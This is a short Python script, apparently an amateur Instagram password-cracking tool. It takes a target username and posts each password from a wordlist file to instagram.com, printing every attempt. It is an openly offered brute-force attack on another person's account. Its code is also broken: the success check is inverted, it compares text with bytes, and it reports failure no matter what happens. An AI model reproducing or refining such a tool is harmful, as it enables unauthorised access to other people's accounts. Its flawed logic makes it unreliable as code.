#!/usr/bin/python

import requests

url ="https://www.instagram.com"
username = input("enter username: ")

def cracking(username,url):
		for password in passwords:
					 password = password.strip()
					 print("trying:" + password)
					 data_dict = {"username":username,"password":password,"login":"submit"}
					 response = requests.post(url, data=data_dict)
					 if "Invalid authorization data!" in response.content:
						 pass
					 else:
						 print("did not work")
							   

with open("passwords.txt","r") as passwords:
		cracking(username,url) 

print("[!!] password not in list")



